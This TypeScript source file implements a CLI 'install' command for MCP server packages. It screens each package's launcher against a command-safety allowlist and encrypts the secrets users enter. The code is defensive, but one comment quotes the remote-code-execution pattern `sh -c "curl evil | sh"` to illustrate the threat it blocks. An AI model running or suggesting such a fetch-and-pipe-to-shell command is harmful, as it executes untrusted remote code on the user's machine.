import * as clack from "@clack/prompts";
import { defineCommand } from "citty";
import { resolveConfigDir } from "../core/config";
import { withConfig } from "../core/controller";
import type { Server } from "../core/schema";
import {
  encryptValue,
  generateKey,
  importKey,
  loadKey,
  resolveKeyPath,
  saveKey,
} from "../core/secrets";
import { requireConfig } from "../lib/errors";
import { amError, error, info, output } from "../lib/output";
import { MarketplaceSecurityError, assertServerCommandSafe } from "../marketplace/security";
import { RegistryError, getPackage } from "../registry/client";
import type { RegistryPackage, RegistryProvenance } from "../registry/types";

// --- Test seam for the interactive clack prompts ---------------------------
//
// `install`'s interactive env-var path drives `clack.text({...})`, which blocks
// on real stdin. A command-level test can inject a deterministic, non-blocking
// double through `__setClackForTests` WITHOUT a process-global
// `mock.module("@clack/prompts", …)` — that approach leaks into every other
// parallel test file that imports clack. This mirrors the identical seam in
// `commands/setup.ts` and is the only sanctioned way to exercise the
// interactive secret prompt in tests.
export type ClackLike = Pick<typeof clack, "text" | "confirm" | "isCancel">;

let clackOverride: ClackLike | null = null;

/** @internal test seam — inject a clack double for the interactive path. */
export function __setClackForTests(impl: ClackLike | null): void {
  clackOverride = impl;
}

/** Resolve the clack implementation (real module, or a test-injected double). */
function getClack(): ClackLike {
  return clackOverride ?? clack;
}

export const installCommand = defineCommand({
  meta: { name: "install", description: "Install MCP server packages from the registry" },
  args: {
    packages: { type: "positional", description: "Package name(s) to install", required: true },
    version: { type: "string", description: "Version to install (applies to all packages)" },
    "dry-run": { type: "boolean", description: "Preview changes without writing", default: false },
    yes: { type: "boolean", alias: "y", description: "Skip confirmation prompts", default: false },
    "trust-commands": {
      type: "boolean",
      description:
        "Install even if the package's server command is a shell or otherwise fails the command-safety allowlist (RCE risk — audit the package first)",
      default: false,
    },
    "no-cache": { type: "boolean", description: "Bypass cache", default: false },
    json: { type: "boolean", description: "JSON output", default: false },
    quiet: { type: "boolean", alias: "q", default: false },
    verbose: { type: "boolean", alias: "v", default: false },
  },
  async run({ args }) {
    const opts = { json: args.json, quiet: args.quiet, verbose: args.verbose };
    try {
      const dryRun = args["dry-run"] ?? false;
      const skipConfirm = args.yes ?? false;
      const skipCache = args["no-cache"] ?? false;
      const trustCommands = args["trust-commands"] ?? false;
      const configDir = resolveConfigDir();

      // Parse package names: citty delivers a single positional as a string
      const packageNames: string[] =
        typeof args.packages === "string"
          ? args.packages.split(",").map((s) => s.trim())
          : [args.packages];

      // REV-1 MEDIUM-2 (2026-04-18): serialize RMW through the controller's
      // withConfig() instead of raw tryReadConfig → writeConfig. This closes
      // the MCP-vs-CLI race that was exactly the hazard Wave B's mutex was
      // built to prevent (the Wave B fix closed MCP-vs-MCP only).
      await withConfig(configDir, async (config) => {
        requireConfig(config);

        // Load encryption key for env var secrets. May be null (no key
        // provisioned yet) — in that case the interactive path lazily generates
        // one ON FIRST NEED via `ensureEncryptionKey` so a user-entered secret
        // is NEVER persisted in plaintext (L7 fix; mirrors `am secret scan
        // --fix`). The generate is deferred (not eager) so a non-interactive
        // install, or an install with no secret prompts, does not write a
        // machine key without cause.
        let encryptionKey = await loadKey(configDir);

        // Lazily provision the AES master key the first time an interactive
        // secret needs encrypting. Returns the live key, or `null` if
        // generation/save failed (the caller then falls back to a ${VAR}
        // placeholder — never the raw value). Caches the result in
        // `encryptionKey` so subsequent prompts reuse the same key.
        let keyProvisionFailed = false;
        async function ensureEncryptionKey(): Promise<CryptoKey | null> {
          if (encryptionKey) return encryptionKey;
          if (keyProvisionFailed) return null;
          try {
            const base64Key = await generateKey();
            await saveKey(configDir, base64Key);
            encryptionKey = await importKey(base64Key);
            info(`Generated encryption key (stored at ${resolveKeyPath()})`, opts);
            return encryptionKey;
          } catch (err) {
            // Fail safe, not loud: if we cannot persist a key, fall back to the
            // ${VAR} placeholder so the entered secret is never written in
            // plaintext. Warn once so the user knows the value wasn't captured.
            keyProvisionFailed = true;
            error(
              `Could not generate an encryption key (${err instanceof Error ? err.message : String(err)}); storing a \${VAR} placeholder instead of the entered value.`,
              opts,
            );
            return null;
          }
        }

        const results: Array<{
          package: string;
          action: "installed" | "skipped" | "replaced" | "failed";
          version?: string;
          reason?: string;
        }> = [];

        for (const pkgName of packageNames) {
          let pkg: RegistryPackage | null;
          try {
            pkg = await getPackage(pkgName, { skipCache });
          } catch (err) {
            const msg = err instanceof RegistryError ? err.message : (err as Error).message;
            error(`Failed to fetch "${pkgName}": ${msg}`, opts);
            results.push({ package: pkgName, action: "failed", reason: msg });
            continue;
          }

          if (!pkg) {
            error(`Package "${pkgName}" not found in the registry.`, opts);
            results.push({ package: pkgName, action: "failed", reason: "not found" });
            continue;
          }

          // Check if server already exists
          const existing = config.servers?.[pkg.name];
          if (existing) {
            // Check if it's a registry-installed server
            const existingProvenance = existing._registry;
            if (existingProvenance) {
              if (existingProvenance.version === pkg.version) {
                info(`"${pkg.name}" is already installed at version ${pkg.version}.`, opts);
                results.push({
                  package: pkg.name,
                  action: "skipped",
                  version: pkg.version,
                  reason: "already installed",
                });
                continue;
              }
            }

            // Server exists — prompt to replace
            if (!skipConfirm && !args.json && process.stdin.isTTY) {
              const c = getClack();
              const replace = await c.confirm({
                message: `Server "${pkg.name}" already exists. Replace it?`,
                initialValue: false,
              });
              if (c.isCancel(replace) || !replace) {
                info(`Skipped "${pkg.name}".`, opts);
                results.push({ package: pkg.name, action: "skipped", reason: "user declined" });
                continue;
              }
            } else if (!skipConfirm) {
              info(`Server "${pkg.name}" already exists. Use --yes to replace.`, opts);
              results.push({ package: pkg.name, action: "skipped", reason: "already exists" });
              continue;
            }
          }

          // M3 (security): gate the resolved server command + argv through the
          // command-safety allowlist BEFORE building or writing the server
          // entry. A malicious registry package can override the launcher via
          // `runtimeHint` (e.g. `{ runtimeHint: "sh" }`) to smuggle the
          // canonical RCE shape `sh -c "curl evil | sh"`. This mirrors the
          // marketplace install path (installer.ts applyPlugin) including the
          // same `--trust-commands` opt-in escape hatch. The check runs in BOTH
          // the dry-run preview and the real-write path, so dry-run reports the
          // identical rejection. Fail closed: a rejected shape is recorded as a
          // "failed" result and is NEVER written to config.
          //
          // Scope discriminator (a598 follow-up): the allowlist applies to any
          // `command` that is an EXECUTABLE the launcher will spawn. The only
          // case where `command` is NOT an executable is a synthesized remote
          // server: registry/client.ts deriveServerConfig stores the endpoint
          // URL in `command` for the `remotes[]` branch (command === url). A URL
          // contains "/", which the allowlist would (incorrectly) deny as a
          // path-bearing executable, so we skip the gate ONLY for that exact
          // shape. We must NOT gate on transport alone: the `packages[]` branch
          // lets a malicious publisher set BOTH a free-form launcher
          // (runtimeHint:"sh") AND a non-stdio transport (transport:"sse") with
          // no url, which previously slipped past a `transport === "stdio"`
          // check and persisted the RCE shape verbatim. Skipping only the
          // url-as-command case keeps remotes working while gating every
          // package-derived launcher regardless of declared transport.
          const isSynthesizedRemoteUrl =
            pkg.server.url !== undefined && pkg.server.command === pkg.server.url;
          if (!isSynthesizedRemoteUrl) {
            try {
              assertServerCommandSafe(
                pkg.server.command,
                pkg.server.args,
                `registry package "${pkg.name}".server.command`,
                { trustCommands },
              );
            } catch (err) {
              if (err instanceof MarketplaceSecurityError) {
                error(err.message, opts);
                results.push({ package: pkg.name, action: "failed", reason: err.message });
                continue;
              }
              throw err;
            }
          }

          // Collect env vars
          const env: Record<string, string> = {};
          const requiredEnvVars = pkg.server.env?.filter((e) => e.required) ?? [];
          const optionalEnvVars = pkg.server.env?.filter((e) => !e.required) ?? [];

          if (requiredEnvVars.length > 0 && !args.json && process.stdin.isTTY && !dryRun) {
            info(`\n"${pkg.name}" requires the following environment variables:`, opts);
            const c = getClack();
            for (const envVar of requiredEnvVars) {
              const value = await c.text({
                message: `${envVar.name}${envVar.description ? ` (${envVar.description})` : ""}`,
                placeholder: envVar.default ?? "",
                validate: (v) => {
                  if (!v.trim()) return `${envVar.name} is required`;
                },
              });
              if (c.isCancel(value)) {
                info(`Installation of "${pkg.name}" cancelled.`, opts);
                results.push({ package: pkg.name, action: "skipped", reason: "cancelled" });
                continue;
              }
              // L7 (security): NEVER persist the raw entered value. When no key
              // is present, lazily generate+save one (parity with `am secret
              // scan --fix`) and encrypt. If key provisioning fails, fall back
              // to the same ${VAR} placeholder the non-interactive branch uses —
              // the plaintext secret is dropped, not written.
              const key = encryptionKey ?? (await ensureEncryptionKey());
              if (key) {
                env[envVar.name] = await encryptValue(value as string, key);
              } else {
                env[envVar.name] = `\${${envVar.name}}`;
              }
            }
          } else if (requiredEnvVars.length > 0 && !dryRun) {
            // Non-interactive: set placeholder values
            for (const envVar of requiredEnvVars) {
              env[envVar.name] = envVar.default ?? `\${${envVar.name}}`;
            }
          }

          // Set defaults for optional env vars
          for (const envVar of optionalEnvVars) {
            if (envVar.default) {
              env[envVar.name] = envVar.default;
            }
          }

          // Build server entry. R4-MED2: resolve transport ONCE and guard the
          // url assignment on the RESOLVED value, not the raw registry field.
          // Previously the url guard checked `pkg.server.transport !== "stdio"`
          // while transport was STORED as `?? "stdio"`, so a package with a url
          // but no transport produced a schema-invalid stdio+url server that the
          // ServerSchema superRefine (Wave-3) rejects on the next config read.
          const transport = pkg.server.transport ?? "stdio";
          const server: Server & { _registry?: RegistryProvenance } = {
            command: pkg.server.command,
            args: pkg.server.args,
            transport,
            enabled: true,
            description: pkg.description,
            tags: pkg.tags,
            ...(Object.keys(env).length > 0 ? { env } : {}),
            _registry: {
              source: "mcp-registry",
              package: pkg.name,
              version: pkg.version,
              installed_at: new Date().toISOString(),
            },
          };

          // Add URL for remote transports (guarded on the RESOLVED transport).
          if (pkg.server.url && transport !== "stdio") {
            server.url = pkg.server.url;
          }

          if (dryRun) {
            info(`[dry-run] Would install "${pkg.name}" v${pkg.version}`, opts);
            info(`  command: ${pkg.server.command}`, opts);
            if (pkg.server.args?.length) info(`  args: ${pkg.server.args.join(" ")}`, opts);
            if (requiredEnvVars.length) {
              info(`  env vars: ${requiredEnvVars.map((e) => e.name).join(", ")}`, opts);
            }
            results.push({ package: pkg.name, action: "installed", version: pkg.version });
            continue;
          }

          // Write to config
          if (!config.servers) config.servers = {};
          const action = existing ? "replaced" : "installed";
          config.servers[pkg.name] = server;

          results.push({ package: pkg.name, action, version: pkg.version });
          info(
            `${action === "replaced" ? "Replaced" : "Installed"} "${pkg.name}" v${pkg.version}`,
            opts,
          );
        }

        // Defer write + commit to withConfig (single point of RMW).
        const shouldWrite =
          !dryRun && results.some((r) => r.action === "installed" || r.action === "replaced");
        const names = results
          .filter((r) => r.action === "installed" || r.action === "replaced")
          .map((r) => r.package);

        // BUG fix (Wave QW): a not-found / fetch-fail package previously left
        // the process exit code at 0, so `am install bogus-pkg` looked like a
        // success to callers and CI. Any "failed" result is a non-zero exit.
        if (results.some((r) => r.action === "failed")) {
          process.exitCode = 1;
        }

        if (args.json) {
          output({ action: "install", dryRun, results }, opts);
        }

        // Post-install hint
        if (!args.json && !args.quiet && !dryRun) {
          const installed = results.filter(
            (r) => r.action === "installed" || r.action === "replaced",
          );
          if (installed.length > 0) {
            info("\nRun `am apply` to generate native configs for your tools.", opts);
          }
        }

        return {
          result: undefined,
          changed: shouldWrite,
          commitMessage: shouldWrite ? `registry install: ${names.join(", ")}` : undefined,
        };
      });
    } catch (err) {
      amError(err, opts);
      process.exitCode = 1;
    }
  },
});
